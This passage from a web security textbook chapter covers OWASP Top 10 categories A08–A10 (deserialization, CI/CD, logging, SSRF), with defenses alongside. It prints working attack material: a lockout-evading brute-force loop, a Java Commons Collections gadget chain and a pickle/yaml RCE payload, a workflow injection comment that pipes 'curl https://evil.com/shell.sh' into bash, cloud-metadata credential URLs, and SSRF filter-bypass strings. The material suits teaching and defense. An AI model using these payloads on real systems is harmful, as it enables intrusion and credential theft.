# If account locks after 5 failures, reset lockout with a successful attempt
for i, password in enumerate(password_list):
    if i % 4 == 3:  # Every 4th attempt, try known password to reset lockout
        requests.post(login_url, data={'username': target, 'password': known_password})
    requests.post(login_url, data={'username': target, 'password': password})

# Technique 3: Distributed brute force
# Spread attempts across multiple IP addresses using cloud providers or botnets
# 1000 IPs × 5 attempts/IP × 60 seconds/minute = 300,000 attempts/hour

# Defense: Progressive delays, not account lockout
def check_login(username, password):
    # Increment delay per failed attempt (per account)
    attempts = redis.incr(f"login_attempts:{username}")
    delay = min(2 ** attempts, 3600)  # Max 1 hour
    time.sleep(delay)
    
    if authenticate(username, password):
        redis.delete(f"login_attempts:{username}")
        return True
    return False
```

---

## A08:2021 – Software and Data Integrity Failures

### Insecure Deserialization

Deserialization vulnerabilities occur when applications reconstruct objects from untrusted data without proper validation:

```java
// Java deserialization attack chain (Apache Commons Collections)
// CVE-2015-4852, CVE-2015-8103, CVE-2016-3510, etc.

// Attack payload construction:
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", 
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec",
        new Class[]{String.class},
        new Object[]{"touch /tmp/pwned"})
};

ChainedTransformer chain = new ChainedTransformer(transformers);
Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, chain);
TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
Map expMap = new HashMap();
expMap.put(entry, "value");
// Serialize expMap and send to vulnerable server
```

```python
# Python pickle deserialization
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

malicious_payload = pickle.dumps(Exploit())
# If server unpickles this data:
# pickle.loads(malicious_payload)  → executes: os.system('id')

# Django/Flask sessions using pickle (or yaml.load without SafeLoader):
import yaml
yaml.load("!!python/object/apply:os.system ['id']")  # RCE
yaml.safe_load("!!python/object/apply:os.system ['id']")  # Blocked by SafeLoader
```

### CI/CD Pipeline Attacks

```yaml
# Malicious GitHub Actions workflow injection
# .github/workflows/deploy.yml
name: Deploy
on:
  issue_comment:
    types: [created]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Process comment
        run: |
          echo "Comment: ${{ github.event.comment.body }}"
          # VULNERABLE: comment body is attacker-controlled
          # Attack comment: "; curl https://evil.com/shell.sh | bash #"
```

**Dependency confusion attacks** (Alex Birsan, 2021): Publishing malicious packages to public registries with names matching internal packages, exploiting build systems that resolve from public registries before private ones.

CI/CD attack surface includes:
- Pipeline configuration injection through user-controlled variables
- Compromised build servers distributing trojanized artifacts
- Tampered container images in registries
- Stolen CI/CD secrets (AWS keys, signing keys, deploy tokens)
- PR-based automation executing untrusted code (e.g., `dependabot` auto-merge with malicious PRs)

---

## A09:2021 – Security Logging and Monitoring Failures

### Insufficient Logging

```python
# Insufficient logging: attacks go undetected
@app.route('/api/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        return jsonify({"token": generate_jwt(user)})
    return jsonify({"error": "Invalid credentials"}), 401
    # Missing: log failed login attempts, source IP, user agent

# Adequate logging: detectable attack patterns
@app.route('/api/login', methods=['POST'])
def login():
    log_data = {
        'event': 'login_attempt',
        'username': request.form.get('username'),
        'source_ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'timestamp': datetime.utcnow().isoformat(),
        'correlation_id': request.headers.get('X-Request-ID', str(uuid4())),
    }
    
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        log_data['event'] = 'login_success'
        log_data['user_id'] = user.id
        logging.info(json.dumps(log_data))
        return jsonify({"token": generate_jwt(user)})
    else:
        log_data['event'] = 'login_failure'
        logging.warning(json.dumps(log_data))
        # Alert on brute force: >5 failures from same IP in 5 minutes
        if is_brute_force(request.remote_addr, request.form.get('username')):
            alert_security_team(log_data)
        return jsonify({"error": "Invalid credentials"}), 401
```

### Log Injection

```python
# Vulnerable: user input directly in log messages
logging.info(f"User login: {username}")
# Attack: username = "admin\nERROR: Database connection failed"
# Log entry becomes two lines, masking attacks

# Secure: sanitize log input
import re
def sanitize_log_input(data):
    return re.sub(r'[\r\n]', '', str(data))

logging.info(f"User login: {sanitize_log_input(username)}")
```

Critical events to log:
- Authentication successes and failures
- Authorization failures (access denied)
- Input validation failures
- Server-side input validation failures (not just client-side)
- Session management events (creation, expiration, destruction)
- Account management events (creation, deletion, role changes)
- Sensitive data access (especially bulk access or export)
- Administrative actions
- Error conditions (especially security-relevant errors)
- Rate limiting triggers
- Changes to security configuration

---

## A10:2021 – Server-Side Request Forgery (SSRF)

SSRF was added to the Top 10 in 2021 based on increasing prevalence, particularly in cloud environments. It enables attackers to induce the server to make requests to unintended destinations.

### Basic SSRF

```http
# Vulnerable URL fetch endpoint
GET /api/fetch?url=https://example.com/image.jpg HTTP/1.1

# Internal service enumeration:
GET /api/fetch?url=http://localhost:8080/admin HTTP/1.1
GET /api/fetch?url=http://127.0.0.1:6379/INFO HTTP/1.1           → Redis info
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1  → AWS metadata

# Cloud metadata SSRF:
# AWS:     http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP:     http://metadata.google.internal/computeMetadata/v1/
# Azure:   http://169.254.169.254/metadata/instance?api-version=2021-02-01
# DigitalOcean: http://169.254.169.254/metadata/v1/
```

### SSRF Filter Bypass Techniques

```bash
# IP address representation bypasses
http://127.0.0.1          → Direct localhost
http://0x7f000001          → Hex localhost
http://0177.0.0.1          → Octal localhost
http://2130706433           → Integer localhost
http://0                    → Zero-address localhost
http://127.1                → Abbreviated localhost
http://[::1]                → IPv6 localhost
http://[::ffff:127.0.0.1]  → IPv6-mapped IPv4 localhost
http://127.0.0.1.nip.io     → DNS rebinding

# URL parser inconsistencies
http://evil.com@target.com   → Some parsers see "evil.com", others "target.com"
http://target.com#@evil.com  → Fragment manipulation
http://target.com.evil.com   → Subdomain takeover
http://ⓔⓥⓘⓛ.com            → IDNA homograph attack

# DNS rebinding
# 1. Attacker controls evil.com DNS
# 2. DNS initially resolves to public IP (passes SSRF filter)
# 3. Application resolves evil.com → 1.2.3.4 (passes check)
# 4. Attacker changes DNS to resolve to 127.0.0.1
# 5. Application makes request to evil.com → 127.0.0.1 (SSRF!)
```

Detailed SSRF exploitation chains are covered in `03a_ssrf_csrflfi.md`.

---

## Cross-Reference Map

| OWASP Category | Primary Deep Dive Chapter |
|----------------|--------------------------|
| A01 Broken Access Control | `02b_authentication_authorization.md` (RBAC/ABAC/ReBAC) |
| A02 Cryptographic Failures | `06b_web_hardening_defense.md` (TLS configuration) |
| A03 Injection | `02a_injection_attacks.md` (all injection types) |
| A04 Insecure Design | This chapter (threat modeling foundations) |
| A05 Security Misconfiguration | `06b_web_hardening_defense.md` (headers, configuration) |
| A06 Vulnerable Components | `07_web_security_future.md` (supply chain) |
| A07 Auth Failures | `02b_authentication_authorization.md` (JWT, OAuth, SAML) |
| A08 Integrity Failures | `04b_deserialization_race_conditions.md` (deserialization) |
| A09 Logging Failures | `06a_web_security_testing.md` (monitoring) |
| A10 SSRF | `03a_ssrf_csrflfi.md` (full SSRF deep dive) |

| Related Tracks | Cross-References |
|----------------|-----------------|
| Cloud Security | Cloud metadata SSRF, IAM exploitation |
| Cryptography | TLS, hashing algorithms, padding oracles |
| Supply Chain Security | Dependency confusion, CI/CD attacks |
| Chromium Isolation | Same-origin policy, CORS, site isolation |

---

*This chapter provides the foundational understanding of each OWASP Top 10 (2021) category. Chapters 02-04 expand on specific categories with exploitation techniques, and Chapters 05-06 cover methodology and defense.*

---

## References

1. OWASP Foundation. "OWASP Top 10:2021." https://owasp.org/Top10/
2. OWASP Foundation. "OWASP Top 10 — A01:2021 Broken Access Control." https://owasp.org/Top10/A01_2021-Broken_Access_Control/
3. OWASP Foundation. "OWASP Top 10 — A02:2021 Cryptographic Failures." https://owasp.org/Top10/A02_2021-Cryptographic_Failures/
4. OWASP Foundation. "OWASP Top 10 — A03:2021 Injection." https://owasp.org/Top10/A03_2021-Injection/
5. OWASP Foundation. "OWASP Top 10 — A04:2021 Insecure Design." https://owasp.org/Top10/A04_2021-Insecure_Design/
6. OWASP Foundation. "OWASP Top 10 — A05:2021 Security Misconfiguration." https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
7. OWASP Foundation. "OWASP Top 10 — A06:2021 Vulnerable and Outdated Components." https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/
8. OWASP Foundation. "OWASP Top 10 — A07:2021 Identification and Authentication Failures." https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
9. OWASP Foundation. "OWASP Top 10 — A08:2021 Software and Data Integrity Failures." https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
10. OWASP Foundation. "OWASP Top 10 — A09:2021 Security Logging and Monitoring Failures." https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/
11. OWASP Foundation. "OWASP Top 10 — A10:2021 Server-Side Request Forgery." https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
12. MITRE Corporation. "CWE/SANS Top 25 Most Dangerous Software Weaknesses." https://cwe.mitre.org/top25/
13. OWASP Foundation. "OWASP Proactive Controls." https://owasp.org/www-project-proactive-controls/
14. OWASP Foundation. "OWASP Application Security Verification Standard (ASVS) 4.0." https://owasp.org/www-project-application-security-verification-standard/
15. Shostack, A. "Threat Modeling: Designing for Security." Wiley, 2014.